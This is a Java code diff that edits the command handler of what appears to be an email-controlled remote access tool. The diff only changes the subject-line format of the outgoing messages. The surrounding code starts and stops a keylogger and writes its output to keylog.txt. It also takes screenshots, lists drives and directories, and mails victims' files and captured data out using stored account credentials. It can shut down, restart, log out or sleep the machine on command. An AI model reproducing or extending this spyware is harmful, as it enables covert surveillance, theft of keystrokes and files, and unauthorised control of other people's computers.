@@ -45,13 +45,13 @@ public class sendResponse {
                 } catch (IOException e) {
                     throw new RuntimeException(e);
                 }
-                sendMail sm = new sendMail(getMail(Server.mailList.getLast()),DEFAULT_MAIL,DEFAULT_PASSWORD,key+" 0 "+Server.numberList.getLast());
+                sendMail sm = new sendMail(getMail(Server.mailList.getLast()),DEFAULT_MAIL,DEFAULT_PASSWORD,key+" "+Server.numberList.getLast());
                 sm.send(appList);
                 break;
             }
             case "1": {
                 kl.start();
-                sendMail sm = new sendMail(getMail(Server.mailList.getLast()),DEFAULT_MAIL,DEFAULT_PASSWORD,key+" 1 "+Server.numberList.getLast());
+                sendMail sm = new sendMail(getMail(Server.mailList.getLast()),DEFAULT_MAIL,DEFAULT_PASSWORD,key+" "+Server.numberList.getLast());
                 sm.sendContent("Successful");
                 System.out.println(1);
                 break;
@@ -60,7 +60,7 @@ public class sendResponse {
             case "2": {
                 String text = kl.end();
                 counts[2]++;
-                sendMail sm = new sendMail(getMail(Server.mailList.getLast()),DEFAULT_MAIL,DEFAULT_PASSWORD,key+" 2 "+Server.numberList.getLast());
+                sendMail sm = new sendMail(getMail(Server.mailList.getLast()),DEFAULT_MAIL,DEFAULT_PASSWORD,key+" "+Server.numberList.getLast());
                 File file = new File("keylog.txt");
                 try {
                     file.createNewFile();
@@ -91,7 +91,7 @@ public class sendResponse {
                 } catch (IOException e) {
                     throw new RuntimeException(e);
                 }
-                sendMail sm = new sendMail(getMail(Server.mailList.getLast()),DEFAULT_MAIL,DEFAULT_PASSWORD,key+" 3 "+Server.numberList.getLast());
+                sendMail sm = new sendMail(getMail(Server.mailList.getLast()),DEFAULT_MAIL,DEFAULT_PASSWORD,key+" "+Server.numberList.getLast());
                 sm.send(file);
                 System.out.println(3);
                 break;
@@ -101,35 +101,35 @@ public class sendResponse {
                 Screenshot sc = new Screenshot();
                 File file;
                 file = sc.takeScreenShot();
-                sendMail sm = new sendMail(getMail(Server.mailList.getLast()),DEFAULT_MAIL,DEFAULT_PASSWORD,key+" 4 "+Server.numberList.getLast());
+                sendMail sm = new sendMail(getMail(Server.mailList.getLast()),DEFAULT_MAIL,DEFAULT_PASSWORD,key+" "+Server.numberList.getLast());
                 sm.send(file);
                 System.out.println(4);
                 break;
             }
             //shutdown
             case "5": {
-                sendMail sm = new sendMail(getMail(Server.mailList.getLast()),DEFAULT_MAIL,DEFAULT_PASSWORD,key+" 5 "+Server.numberList.getLast());
+                sendMail sm = new sendMail(getMail(Server.mailList.getLast()),DEFAULT_MAIL,DEFAULT_PASSWORD,key+" "+Server.numberList.getLast());
                 sm.sendContent("Successful");
                 SRS.shutdown();
                 break;
             }
             //restart
             case "6": {
-                sendMail sm = new sendMail(getMail(Server.mailList.getLast()),DEFAULT_MAIL,DEFAULT_PASSWORD,key+" 6 "+Server.numberList.getLast());
+                sendMail sm = new sendMail(getMail(Server.mailList.getLast()),DEFAULT_MAIL,DEFAULT_PASSWORD,key+" "+Server.numberList.getLast());
                 sm.sendContent("Successful");
                 SRS.restart();
                 break;
             }
             //logout
             case "7": {
-                sendMail sm = new sendMail(getMail(Server.mailList.getLast()),DEFAULT_MAIL,DEFAULT_PASSWORD,key+" 7 "+Server.numberList.getLast());
+                sendMail sm = new sendMail(getMail(Server.mailList.getLast()),DEFAULT_MAIL,DEFAULT_PASSWORD,key+" "+Server.numberList.getLast());
                 sm.sendContent("Successful");
                 SRS.logout();
                 break;
             }
             //sleep
             case "8": {
-                sendMail sm = new sendMail(getMail(Server.mailList.getLast()),DEFAULT_MAIL,DEFAULT_PASSWORD,key+" 8 "+Server.numberList.getLast());
+                sendMail sm = new sendMail(getMail(Server.mailList.getLast()),DEFAULT_MAIL,DEFAULT_PASSWORD,key+" "+Server.numberList.getLast());
                 sm.sendContent("Successful");
                 SRS.sleep();
                 break;
@@ -139,7 +139,7 @@ public class sendResponse {
                 GetFile gf = new GetFile();
                 if (Server.reqList.get(index).length()<=2){
                     String text = gf.listDrive();
-                    sendMail sm = new sendMail(getMail(Server.mailList.getLast()),DEFAULT_MAIL,DEFAULT_PASSWORD,key+" 9 "+Server.numberList.getLast());
+                    sendMail sm = new sendMail(getMail(Server.mailList.getLast()),DEFAULT_MAIL,DEFAULT_PASSWORD,key+" "+Server.numberList.getLast());
                     sm.sendContent(text);
                 }
                 else {
@@ -147,16 +147,16 @@ public class sendResponse {
                     File file = new File(path);
                     if (file.isDirectory()){
                         String text = gf.listFile(file.getAbsolutePath());
-                        sendMail sm = new sendMail(getMail(Server.mailList.getLast()),DEFAULT_MAIL,DEFAULT_PASSWORD,key+" 9 "+Server.numberList.getLast());
+                        sendMail sm = new sendMail(getMail(Server.mailList.getLast()),DEFAULT_MAIL,DEFAULT_PASSWORD,key+" "+Server.numberList.getLast());
                         sm.sendContent(text);
                     }
                     else {
                         if (file.exists()){
-                            sendMail sm = new sendMail(getMail(Server.mailList.getLast()),DEFAULT_MAIL,DEFAULT_PASSWORD,key+" 9 "+Server.numberList.getLast());
+                            sendMail sm = new sendMail(getMail(Server.mailList.getLast()),DEFAULT_MAIL,DEFAULT_PASSWORD,key+" "+Server.numberList.getLast());
                             sm.send(file);
                         }
                         else{
-                            sendMail sm = new sendMail(getMail(Server.mailList.getLast()),DEFAULT_MAIL,DEFAULT_PASSWORD,key+" 9 "+Server.numberList.getLast());
+                            sendMail sm = new sendMail(getMail(Server.mailList.getLast()),DEFAULT_MAIL,DEFAULT_PASSWORD,key+" "+Server.numberList.getLast());
                             sm.sendContent("File do not exist");
                         }
                     }
